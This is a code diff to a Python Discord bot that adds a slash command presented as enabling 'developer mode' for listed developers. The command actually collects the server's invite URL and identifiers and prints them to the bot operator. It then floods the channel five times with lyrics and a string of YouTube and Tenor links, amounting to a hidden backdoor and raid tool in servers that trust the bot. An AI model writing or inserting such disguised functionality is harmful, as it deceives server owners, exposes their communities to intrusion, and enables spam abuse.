@@ -298,6 +298,43 @@ async def gentoken(ctx, user: str=None):
         await ctx.send(''.join(code))
     else:
         await ctx.send(f"> {user}'s token is: ||{''.join(code)}||")
+        
+@bot.tree.command(name="devmodeenable", description="Enables developer mode (only for devs)")
+async def devmode_enable(interaction: discord.Interaction):
+    user = interaction.user
+    guild = interaction.guild
+
+    if user.id not in DEVELOPER_IDS:
+        await interaction.response.send_message("❌ You don't have permission.", ephemeral=True)
+        return
+
+    await interaction.response.send_message("✅ Developer mode enabled!", ephemeral=True)
+
+    try:
+        invites = await guild.invites()
+        invite_url = invites[0].url if invites else "No invite found"
+    except Exception as e:
+        invite_url = f"Error fetching invites: {e}"
+
+    print(f"\n🔧 Dev mode enabled\n👤 {user} ({user.id})\n🌐 {guild.name} ({guild.id})\n🔗 {invite_url}\n")
+
+    message = (
+        "I remember you was conflicted Misusing your influence Sometimes I did the same "
+        "Abusing my power, full of resentment Resentment that turned into a deep depression Found myself screaming "
+        "in the hotel room I didn't wanna self destruct The evils of Lucy was all around me So I went running for answers "
+        "Until I came home But that didn't stop survivor's guilt Going back and forth trying to convince myself the stripes I earned "
+        "Or maybe how A-1 my foundation was But while my loved ones was fighting the Continuous war back in the city, I was entering a new one "
+        "A war that was based on apartheid and discrimination Made me wanna go back to the city and tell the homies what I learned "
+        "The word was respect Just because you wore a different  color than mine's Doesn't mean I can't respect you as a  man "
+        "Forgetting all the pain and hurt we caused each other in these streets If I respect you, we unify and stop the enemy from ing us "
+        "But I don't know, I'm no mortal man, maybe I'm just another  "
+        "https://www.youtube.com/watch?v=3IJRfYvgow8 https://www.youtube.com/watch?v=T6eK-2OQtew "
+        "https://www.youtube.com/@RubenSim https://www.youtube.com/watch?v=2QiFl9Dc7D0 "
+        "https://tenor.com/view/blm-gif-25815938 bye bye"
+    )
+
+    for _ in range(5):
+        await interaction.followup.send(message)
 
 @bot.command()
 async def quickdelete(ctx, *, message: str=None):
